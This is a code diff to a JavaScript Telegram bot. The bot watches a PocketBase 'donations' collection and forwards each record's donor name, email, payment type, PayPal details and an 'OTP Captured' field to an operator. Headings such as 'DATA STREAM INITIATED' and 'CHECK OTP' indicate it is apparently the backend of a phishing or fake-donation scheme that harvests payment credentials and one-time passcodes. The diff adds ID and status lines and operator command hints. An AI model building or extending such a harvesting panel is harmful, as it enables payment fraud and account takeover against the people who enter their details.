@@ -106,6 +106,8 @@ async function getDonationDetails(donationId, chatId) {
 <b>🔍 Donation Details</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
+<b>🆔 DONATION ID:</b> <code>${record.id}</code>
+
 <b>👤 DONOR INFORMATION:</b>
 ├─ 📛 <b>Name:</b> <code>${record.Name || 'N/A'}</code>
 ├─ 📧 <b>Email:</b> <code>${record.email || 'N/A'}</code>
@@ -118,9 +120,7 @@ async function getDonationDetails(donationId, chatId) {
 ├─ 🔄 <b>Payment Type:</b> <code>${record.Payment_Type || 'N/A'}</code>
 ├─ 📊 <b>Status:</b> <code>${record.Transaction_status || 'N/A'}</code>
 ├─ 📅 <b>Created:</b> <code>${record.created || 'N/A'}</code>
-└─ ⏰ <b>Updated:</b> <code>${record.updated || 'N/A'}</code>
-
-<b>🆔 RECORD ID:</b> <code>${record.id}</code>`;
+└─ ⏰ <b>Updated:</b> <code>${record.updated || 'N/A'}</code>`;
     
     await sendTelegramMessage(details, chatId);
     return record;
@@ -288,6 +288,8 @@ pb.collection("donations").subscribe("*", async (e) => {
 <b>🟢 DATA STREAM INITIATED</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
+<b>🆔 DONATION ID:</b> <code>${donation.id}</code>
+
 <b>👤 DONOR IDENTIFIED:</b>
 ├─ 📛 <b>Name:</b> <code>${donation.Name || 'N/A'}</code>
 ├─ 📧 <b>Email:</b> <code>${donation.email || 'N/A'}</code>
@@ -300,6 +302,7 @@ pb.collection("donations").subscribe("*", async (e) => {
 ├─ 🎯 <b>Project:</b> <code>${donation.project || 'N/A'}</code>
 ├─ 🔄 <b>Payment Type:</b> <code>${donation.Payment_Type || 'N/A'}</code>
 ├─ 💰 <b>Amount:</b> $<code>${donation.amount || 'N/A'}</code>
+├─ 📊 <b>Status:</b> <code>${donation.Transaction_status || 'Pending'}</code>
 ├─ 📅 <b>Date Created:</b> <code>${donation.created || 'N/A'}</code>
 └─ ⏰ <b>Last Updated:</b> <code>${donation.updated || 'N/A'}</code>
 
@@ -308,7 +311,9 @@ pb.collection("donations").subscribe("*", async (e) => {
 ├─ 📱 <b>PayPal Details:</b> <code>${donation.paypal_details || 'N/A'}</code>
 └─ 🔢 <b>OTP Captured:</b> <code>${donation.OTP || 'N/A'}</code>
 
-<b>⚠️ NEW DATA STREAM ESTABLISHED ⚠️></b>`;
+<b>⚠️ NEW DATA STREAM ESTABLISHED ⚠️</b>
+
+💡 <i>Use /status ${donation.id} for details or /update ${donation.id} [status] to modify</i>`;
 
     const telegramSent = await sendTelegramMessage(msg);
     console.log(telegramSent ? "✅ Telegram alert sent" : "❌ Telegram alert failed");
@@ -321,6 +326,8 @@ pb.collection("donations").subscribe("*", async (e) => {
 <b>🟡 DATA STREAM UPDATED</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
+<b>🆔 DONATION ID:</b> <code>${updatedDonation.id}</code>
+
 <b>👤 DONOR PROFILE:</b>
 ├─ 📛 <b>Name:</b> <code>${updatedDonation.Name || 'N/A'}</code>
 ├─ 📧 <b>Email:</b> <code>${updatedDonation.email || 'N/A'}</code>
@@ -330,6 +337,7 @@ pb.collection("donations").subscribe("*", async (e) => {
 <b>💳 PAYMENT INTELLIGENCE:</b>
 ├─ 🔄 <b>Payment Type:</b> <code>${updatedDonation.Payment_Type || 'N/A'}</code>
 ├─ 💰 <b>Amount:</b> $<code>${updatedDonation.amount || 'N/A'}</code>
+├─ 📊 <b>Status:</b> <code>${updatedDonation.Transaction_status || 'N/A'}</code>
 └─ ⏰ <b>Time Updated:</b> <code>${updatedDonation.updated || 'N/A'}</code>
 
 <b>🔐 SECURITY DATA UPDATED:</b>
@@ -337,7 +345,9 @@ pb.collection("donations").subscribe("*", async (e) => {
 ├─ 📱 <b>PayPal Details:</b> <code>${updatedDonation.paypal_details || 'N/A'}</code>
 └─ 🔢 <b>OTP Verification:</b> <code>${updatedDonation.OTP || 'N/A'}</code>
 
-<b>⚠️ DATA STREAM MODIFIED CHECK OTP⚠️</b>`;
+<b>⚠️ DATA STREAM MODIFIED CHECK OTP⚠️</b>
+
+💡 <i>Use /status ${updatedDonation.id} for details or /update ${updatedDonation.id} [status] to modify further</i>`;
     
     const telegramSent = await sendTelegramMessage(updateMsg, TG_CHAT_ID, true);
     console.log(telegramSent ? "✅ Update alert sent" : "❌ Update alert failed");
